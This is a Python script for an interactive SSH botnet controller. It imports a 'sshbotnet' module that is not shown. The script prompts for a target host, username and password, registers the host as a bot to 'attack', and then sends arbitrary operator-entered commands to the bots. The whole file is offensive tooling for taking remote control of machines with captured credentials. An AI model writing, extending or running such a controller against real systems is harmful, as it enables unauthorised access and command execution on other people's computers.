#!/usr/bin/python3

from sshbotnet import BotNet

def print_welcome():
    print("""
    [+] Welcome to the net lmao
    [+] Please name your botnet""")

def print_bot_menu():
    print("""
    [++++++++++++++++++++++++++++++++]
    [+] We have a session -- What do?
    [+] 1. Send a command
    [+] 2. Kill the session""")

def main():
    print_welcome()
    net_name = input(">> ")

    botnet = BotNet(net_name)
    print(f"[+] Cool cool -- Setting up your botnet with the name: {net_name}")
    
    bot_count = botnet.get_bot_count()
    if bot_count == 0:
        print("[+] Dang, it looks you don't have any bots... ")
        print("[+] Would you like to create one?")
        ans = input(">> ")
        if ans == "yes" or ans == "y":
            print("[+] What are you gonna call it?")
            bot_name = input(">> ")
            print("[+] Nice. What's its target host's address?")
            target_host = input(">> ")
            print("[+] Right on. What are the creds?")
            target_user = input(">> Username: ")
            print("[+] And the password?")
            target_pass = input(">> Password: ")

            print(f"[+] Alright, setting up the {bot_name} bot to attack {target_user} on {target_host}")
            botnet.add_client(target_host, target_user, target_pass)
        else:
            print("[-] Uhhh, well I guess I'm not sure what we're doing here then...")
            exit()

    while True:
        cont = True
        while cont:
            print_bot_menu()
            ans = input(">> ")
            if ans == "1":
                print("[+] What are we gonna do?")
                command = input(">> ")
                botnet.botnet_command(command)
            elif ans == "2":
                print("[+] Okay, see ya! Gonna kill this sesh now")
                botnet.kill_client(target_host)
                cont = False
            else:
                print("[-] Uhhhhh, why don't you try that again?")
        break



    return


if __name__ == "__main__":
    main()